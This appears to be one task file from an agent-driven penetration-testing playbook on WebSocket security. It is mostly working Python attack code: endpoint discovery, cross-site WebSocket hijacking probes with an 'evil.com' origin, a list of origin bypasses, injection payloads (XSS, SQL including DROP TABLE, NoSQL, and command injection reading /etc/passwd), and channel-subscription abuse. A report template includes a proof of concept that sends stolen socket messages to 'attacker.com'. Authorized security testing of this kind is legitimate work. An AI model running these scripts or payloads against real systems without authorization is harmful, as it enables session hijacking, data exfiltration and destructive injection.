================================================================================
TASK 103 - WEBSOCKET SECURITY TESTING
================================================================================
Covers testing_toolkit.txt Phase 15 Step 58
WebSocket hijacking, injection, and message tampering

WEBSOCKETS = REAL-TIME ATTACK SURFACE
Persistent connections, bidirectional comms, often forgotten in security reviews.

================================================================================
INPUTS
================================================================================
outputs/live_base_urls.txt                 <- Live hosts
outputs/url_corpus_all_in_scope.txt        <- URL corpus  
outputs/har/accounts/*_auth.json           <- Auth tokens

================================================================================
OUTPUTS
================================================================================
outputs/websocket/
    endpoints.txt                          <- WebSocket endpoints found
    messages_captured.json                 <- Sample messages
    hijacking_results.txt                  <- CSWSH test results
    injection_results.txt                  <- Injection test results

outputs/vulnerabilities/WEBSOCKET-*-HIGH.md

================================================================================
ðŸ§  AGENT DECISION FRAMEWORK
================================================================================

UNDERSTAND WEBSOCKET ATTACKS:

    WebSocket attack surface:
    |
    +-- Cross-Site WebSocket Hijacking (CSWSH)
    |   +-- No Origin header validation
    |   +-- No CSRF tokens
    |   +-- Attacker can connect from any origin
    |
    +-- Authentication Issues
    |   +-- Token passed in URL (logged)
    |   +-- No re-authentication on reconnect
    |   +-- Session token reuse
    |
    +-- Authorization Bypass
    |   +-- Subscribe to unauthorized channels
    |   +-- Access other users' data streams
    |   +-- Admin actions via message manipulation
    |
    +-- Injection Attacks
    |   +-- SQL injection in message data
    |   +-- XSS via reflected messages
    |   +-- Command injection
    |
    +-- DoS
        +-- Message flooding
        +-- Large message attacks
        +-- Connection exhaustion

================================================================================
PHASE 1: WEBSOCKET ENDPOINT DISCOVERY
================================================================================

-----------------------------------------
1.1 Find WebSocket Endpoints
-----------------------------------------
#!/usr/bin/env python3
"""
websocket_scanner.py - WebSocket endpoint detection
"""

import requests
import re
import json
import os
from urllib.parse import urlparse, urljoin

os.makedirs('outputs/websocket', exist_ok=True)
os.makedirs('outputs/vulnerabilities', exist_ok=True)

requests.packages.urllib3.disable_warnings()

class WebSocketScanner:
    
    def __init__(self):
        self.session = requests.Session()
        self.endpoints = []
    
    def find_from_js(self, js_urls):
        """Extract WebSocket URLs from JavaScript files"""
        
        ws_patterns = [
            r'wss?://[^\s\'"<>]+',
            r'new\s+WebSocket\s*\([\'"]([^\'"]+)[\'"]',
            r'\.connect\s*\([\'"]([^\'"]+)[\'"]',
            r'socket(?:URL|Uri|Path)\s*[=:]\s*[\'"]([^\'"]+)[\'"]',
        ]
        
        for js_url in js_urls:
            try:
                resp = self.session.get(js_url, timeout=15, verify=False)
                content = resp.text
                
                for pattern in ws_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    for match in matches:
                        if match.startswith('ws'):
                            self.endpoints.append(match)
                        elif match.startswith('/'):
                            # Relative WebSocket path
                            base = urlparse(js_url)
                            ws_url = f"wss://{base.netloc}{match}"
                            self.endpoints.append(ws_url)
                            
            except:
                continue
        
        return list(set(self.endpoints))
    
    def find_common_paths(self, base_urls):
        """Check common WebSocket paths"""
        
        ws_paths = [
            '/ws',
            '/websocket',
            '/socket',
            '/socket.io/',
            '/sockjs/',
            '/signalr/',
            '/cable',
            '/realtime',
            '/live',
            '/stream',
            '/chat',
            '/notifications',
            '/api/ws',
        ]
        
        for base in base_urls:
            parsed = urlparse(base)
            
            for path in ws_paths:
                # Try WebSocket upgrade request
                ws_url = f"wss://{parsed.netloc}{path}"
                http_url = f"https://{parsed.netloc}{path}"
                
                try:
                    # Check if endpoint responds to upgrade
                    resp = self.session.get(
                        http_url,
                        headers={
                            'Connection': 'Upgrade',
                            'Upgrade': 'websocket',
                            'Sec-WebSocket-Version': '13',
                            'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ=='
                        },
                        timeout=10,
                        verify=False,
                        allow_redirects=False
                    )
                    
                    # 101 = switching protocols = WebSocket
                    if resp.status_code == 101:
                        self.endpoints.append(ws_url)
                    elif resp.status_code == 426:
                        # Upgrade required - endpoint exists
                        self.endpoints.append(ws_url)
                    elif 'websocket' in resp.text.lower():
                        self.endpoints.append(ws_url)
                        
                except:
                    continue
        
        return list(set(self.endpoints))

================================================================================
PHASE 2: CROSS-SITE WEBSOCKET HIJACKING (CSWSH)
================================================================================

-----------------------------------------
2.1 CSWSH Test
-----------------------------------------
"""
CSWSH occurs when:
1. WebSocket doesn't validate Origin header
2. Authentication relies only on cookies
3. No CSRF tokens required

Test: Connect from different Origin, see if authenticated
"""

import asyncio
import websockets
import ssl

ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

async def test_cswsh(ws_url, cookies=None, origin='https://evil.com'):
    """Test for Cross-Site WebSocket Hijacking"""
    
    headers = {
        'Origin': origin,
        'Cookie': cookies if cookies else ''
    }
    
    results = {
        'url': ws_url,
        'vulnerable': False,
        'origin_tested': origin,
        'details': ''
    }
    
    try:
        async with websockets.connect(
            ws_url,
            extra_headers=headers,
            ssl=ssl_context
        ) as ws:
            
            # Connection succeeded from foreign origin
            results['vulnerable'] = True
            results['details'] = 'Connection accepted from foreign origin'
            
            # Try to receive a message
            try:
                msg = await asyncio.wait_for(ws.recv(), timeout=5)
                results['received_data'] = True
                results['sample_message'] = str(msg)[:200]
            except:
                results['received_data'] = False
                
    except websockets.exceptions.InvalidStatusCode as e:
        if e.status_code == 403:
            results['details'] = 'Origin validation in place (403)'
        else:
            results['details'] = f'Rejected with status {e.status_code}'
            
    except Exception as e:
        results['details'] = str(e)
    
    return results

-----------------------------------------
2.2 Origin Bypass Tests
-----------------------------------------
async def test_origin_bypass(ws_url, target_domain):
    """Test various Origin header bypasses"""
    
    bypass_origins = [
        f'https://{target_domain}',              # Legitimate
        f'https://{target_domain}.evil.com',     # Subdomain bypass
        f'https://evil.com.{target_domain}',     # Reverse subdomain
        f'https://evil{target_domain}',          # Prefix bypass
        f'https://{target_domain}evil.com',      # Suffix bypass
        'null',                                   # Null origin
        '',                                       # Empty origin
        f'https://www.{target_domain}',          # www variant
        f'https://{target_domain}:443',          # With port
        f'https://{target_domain}.',             # Trailing dot
    ]
    
    results = []
    
    for origin in bypass_origins:
        headers = {'Origin': origin} if origin else {}
        
        try:
            async with websockets.connect(
                ws_url,
                extra_headers=headers,
                ssl=ssl_context
            ) as ws:
                results.append({
                    'origin': origin or '(empty)',
                    'accepted': True
                })
        except:
            results.append({
                'origin': origin or '(empty)',
                'accepted': False
            })
    
    return results

================================================================================
PHASE 3: MESSAGE SECURITY TESTING
================================================================================

-----------------------------------------
3.1 WebSocket Message Analyzer
-----------------------------------------
import json

async def analyze_messages(ws_url, auth_headers=None, duration=30):
    """Connect and analyze WebSocket messages"""
    
    messages = []
    
    headers = auth_headers or {}
    
    try:
        async with websockets.connect(
            ws_url,
            extra_headers=headers,
            ssl=ssl_context
        ) as ws:
            
            start = asyncio.get_event_loop().time()
            
            while (asyncio.get_event_loop().time() - start) < duration:
                try:
                    msg = await asyncio.wait_for(ws.recv(), timeout=5)
                    messages.append({
                        'direction': 'received',
                        'data': str(msg),
                        'is_json': _is_json(msg),
                        'sensitive_data': _check_sensitive(msg)
                    })
                except asyncio.TimeoutError:
                    continue
                    
    except:
        pass
    
    return messages

def _is_json(data):
    try:
        json.loads(data)
        return True
    except:
        return False

def _check_sensitive(data):
    """Check for sensitive data patterns"""
    sensitive_patterns = [
        'password', 'token', 'secret', 'key', 'auth',
        'credit', 'ssn', 'email', 'phone', 'address'
    ]
    
    data_lower = str(data).lower()
    found = []
    
    for pattern in sensitive_patterns:
        if pattern in data_lower:
            found.append(pattern)
    
    return found

================================================================================
PHASE 4: INJECTION TESTING
================================================================================

-----------------------------------------
4.1 WebSocket Injection Payloads
-----------------------------------------
WS_INJECTION_PAYLOADS = [
    # XSS payloads
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "'-alert(1)-'",
    
    # SQL injection
    "' OR '1'='1",
    '"; DROP TABLE users;--',
    "1' AND SLEEP(5)--",
    
    # Command injection
    '; ls -la',
    '| cat /etc/passwd',
    '`id`',
    
    # JSON injection
    '{"admin": true}',
    '{"role": "admin", "$gt": ""}',
    
    # NoSQL injection
    '{"$ne": ""}',
    '{"$regex": ".*"}',
]

async def test_ws_injection(ws_url, message_template, auth_headers=None):
    """Test for injection vulnerabilities in WebSocket messages"""
    
    headers = auth_headers or {}
    findings = []
    
    for payload in WS_INJECTION_PAYLOADS:
        try:
            async with websockets.connect(
                ws_url,
                extra_headers=headers,
                ssl=ssl_context
            ) as ws:
                
                # Send payload
                if isinstance(message_template, dict):
                    message = json.dumps({**message_template, 'data': payload})
                else:
                    message = message_template.replace('{PAYLOAD}', payload)
                
                await ws.send(message)
                
                # Wait for response
                try:
                    resp = await asyncio.wait_for(ws.recv(), timeout=5)
                    
                    # Check for injection indicators
                    resp_lower = str(resp).lower()
                    
                    if any(x in resp_lower for x in ['error', 'syntax', 'sql', 'exception']):
                        findings.append({
                            'payload': payload,
                            'response': str(resp)[:200],
                            'type': 'potential_injection'
                        })
                    
                    # Check for reflected payload (XSS)
                    if payload in str(resp):
                        findings.append({
                            'payload': payload,
                            'response': str(resp)[:200],
                            'type': 'reflected_payload'
                        })
                        
                except:
                    pass
                    
        except:
            continue
    
    return findings

================================================================================
PHASE 5: AUTHORIZATION TESTING
================================================================================

-----------------------------------------
5.1 Channel/Room Authorization
-----------------------------------------
async def test_channel_auth(ws_url, channels, auth_headers=None):
    """Test if we can subscribe to unauthorized channels"""
    
    headers = auth_headers or {}
    findings = []
    
    # Common message formats for subscriptions
    subscription_messages = [
        {'type': 'subscribe', 'channel': '{CHANNEL}'},
        {'action': 'subscribe', 'room': '{CHANNEL}'},
        {'event': 'subscribe', 'data': {'channel': '{CHANNEL}'}},
        '{\"subscribe\":\"{CHANNEL}\"}',
    ]
    
    for channel in channels:
        for msg_template in subscription_messages:
            try:
                async with websockets.connect(
                    ws_url,
                    extra_headers=headers,
                    ssl=ssl_context
                ) as ws:
                    
                    if isinstance(msg_template, dict):
                        msg = json.dumps(msg_template).replace('{CHANNEL}', channel)
                    else:
                        msg = msg_template.replace('{CHANNEL}', channel)
                    
                    await ws.send(msg)
                    
                    try:
                        resp = await asyncio.wait_for(ws.recv(), timeout=5)
                        
                        # Check for successful subscription
                        resp_lower = str(resp).lower()
                        if 'success' in resp_lower or 'subscribed' in resp_lower:
                            findings.append({
                                'channel': channel,
                                'message_format': str(msg_template),
                                'response': str(resp)[:200]
                            })
                            
                    except:
                        pass
                        
            except:
                continue
    
    return findings

================================================================================
PHASE 6: FULL AUTOMATION
================================================================================

#!/usr/bin/env python3
"""
websocket_audit.py - Complete WebSocket security testing
"""

import os
import json
import re
import asyncio
import ssl

try:
    import websockets
except ImportError:
    print("Installing websockets...")
    os.system('pip install websockets')
    import websockets

os.makedirs('outputs/websocket', exist_ok=True)
os.makedirs('outputs/vulnerabilities', exist_ok=True)

ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

class WebSocketAudit:
    
    def __init__(self):
        self.endpoints = []
        self.findings = []
    
    def find_endpoints_from_urls(self, urls):
        """Extract potential WebSocket URLs"""
        
        import requests
        requests.packages.urllib3.disable_warnings()
        session = requests.Session()
        
        # Get JS files
        js_urls = [u for u in urls if '.js' in u and not '.json' in u]
        
        ws_pattern = r'wss?://[^\s\'"<>]+'
        
        for js_url in js_urls[:100]:  # Limit
            try:
                resp = session.get(js_url, timeout=15, verify=False)
                matches = re.findall(ws_pattern, resp.text)
                self.endpoints.extend(matches)
            except:
                continue
        
        # Also check common paths
        from urllib.parse import urlparse
        base_hosts = list(set([
            f"{urlparse(u).netloc}" for u in urls
        ]))
        
        ws_paths = ['/ws', '/websocket', '/socket.io/', '/cable']
        
        for host in base_hosts[:50]:
            for path in ws_paths:
                self.endpoints.append(f"wss://{host}{path}")
        
        self.endpoints = list(set(self.endpoints))
        return self.endpoints
    
    async def test_cswsh(self, ws_url):
        """Test for CSWSH"""
        
        try:
            async with websockets.connect(
                ws_url,
                extra_headers={'Origin': 'https://evil.com'},
                ssl=ssl_context
            ) as ws:
                self.findings.append({
                    'url': ws_url,
                    'type': 'cswsh',
                    'severity': 'HIGH',
                    'details': 'Accepts connection from foreign origin'
                })
                return True
        except:
            return False
    
    async def test_all(self):
        """Test all endpoints"""
        
        for endpoint in self.endpoints:
            await self.test_cswsh(endpoint)
    
    def generate_reports(self):
        """Generate vulnerability reports"""
        
        for i, finding in enumerate(self.findings):
            if finding['type'] == 'cswsh':
                report = f"""# Cross-Site WebSocket Hijacking (CSWSH)

**URL**: {finding['url']}
**Severity**: HIGH

## Description
The WebSocket endpoint accepts connections from any Origin, allowing Cross-Site WebSocket Hijacking attacks.

## Impact
- Attacker can hijack authenticated WebSocket connections
- Real-time data exfiltration
- Actions performed on behalf of victim

## PoC HTML
```html
<html>
<body>
<script>
var ws = new WebSocket("{finding['url']}");
ws.onmessage = function(e) {{
    // Exfiltrate received data
    new Image().src = "https://attacker.com/log?data=" + encodeURIComponent(e.data);
}};
</script>
</body>
</html>
```

## Recommendations
1. Validate Origin header on server side
2. Implement WebSocket CSRF tokens
3. Don't rely solely on cookies for authentication
4. Use secure token in first message exchange
"""
                with open(f'outputs/vulnerabilities/WEBSOCKET-CSWSH-{i}-HIGH.md', 'w') as f:
                    f.write(report)
    
    def save_results(self):
        """Save results"""
        
        with open('outputs/websocket/endpoints.txt', 'w') as f:
            for ep in self.endpoints:
                f.write(f"{ep}\n")
        
        with open('outputs/websocket/findings.json', 'w') as f:
            json.dump(self.findings, f, indent=2)

async def main():
    # Load URLs
    with open('outputs/url_corpus_all_in_scope.txt') as f:
        urls = [l.strip() for l in f if l.strip()]
    
    audit = WebSocketAudit()
    audit.find_endpoints_from_urls(urls)
    
    print(f"[*] Found {len(audit.endpoints)} potential WebSocket endpoints")
    
    await audit.test_all()
    audit.save_results()
    audit.generate_reports()
    
    print(f"[*] WebSocket findings: {len(audit.findings)}")

if __name__ == "__main__":
    asyncio.run(main())

================================================================================
SUMMARY CHECKLIST
================================================================================

[ ] WebSocket endpoints discovered
[ ] CSWSH tested (foreign Origin)
[ ] Origin bypass techniques tested
[ ] Message format analyzed
[ ] Injection payloads tested
[ ] Channel authorization tested
[ ] All findings documented

================================================================================
NEXT TASK
================================================================================
Task 104: Final Reporting & Closeout (Phase 16 - Closeout)
